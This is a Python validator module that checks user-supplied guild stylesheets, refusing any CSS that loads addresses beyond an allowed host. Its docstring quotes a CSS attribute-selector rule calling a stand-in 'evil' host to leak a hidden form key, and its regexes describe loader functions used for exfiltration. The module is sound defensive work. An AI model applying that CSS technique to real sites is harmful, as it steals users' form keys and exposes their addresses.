"""What a guild's own stylesheet may load: pictures from the site's own bucket and nothing else (bug hunt 2026-10, M1).
Pure, no Flask.

The guild page draws the stylesheet for every reader, so an outside address in it tells another server each reader's
address, and a rule like `input[name=formkey][value^=a] { background: url(https://evil/a) }` reads a hidden form key
one character at a time. The route parses the CSS with cssutils first; this is the last word, on the text exactly as
it will be served: every `url(...)` must be on the allowed host, and nothing else that loads an address is there at
all (`@import`, `@namespace`, `image-set()` and the other functions that take a plain string as an address)."""
import re
from urllib.parse import urlsplit

NO_OUTSIDE = "No external links allowed."

_LOADERS = re.compile(r"(?<![a-z0-9_-])(?:-webkit-|-moz-)?(?:image-set|image|cross-fade|element|paint|src)\s*\(")
_URL = re.compile(r"url\(\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s'\")]*))\s*\)")
# loads nothing from anywhere: a reference into the page itself (an SVG filter) and a raster picture written inline
_IN_PAGE = re.compile(r"#[a-z][a-z0-9_-]*")
_INLINE_PICTURE = re.compile(r"data:image/(?:png|gif|jpeg|webp)(?:;base64)?,[a-z0-9+/=%]*")


def refusal(css, allowed_host):
    """None when `css` loads nothing but pictures on `allowed_host`, else the message for the guildmaster."""
    text = (css or "").lower()
    if "\\" in text:                                   # escapes could spell an address the checks below can't see
        return NO_OUTSIDE
    if "@import" in text or "@namespace" in text or _LOADERS.search(text):
        return NO_OUTSIDE
    found = list(_URL.finditer(text))
    if len(found) != text.count("url("):              # a url( that isn't a whole url(...) is not judged: refused
        return NO_OUTSIDE
    allowed = (allowed_host or "").lower()
    for match in found:
        address = next(group for group in match.groups() if group is not None).strip()
        if _IN_PAGE.fullmatch(address) or _INLINE_PICTURE.fullmatch(address):
            continue
        try:
            parts = urlsplit(address)
            host = parts.hostname
        except ValueError:
            return NO_OUTSIDE
        if not allowed or parts.scheme not in ("http", "https") or host != allowed or parts.username or parts.password:
            return NO_OUTSIDE
    return None
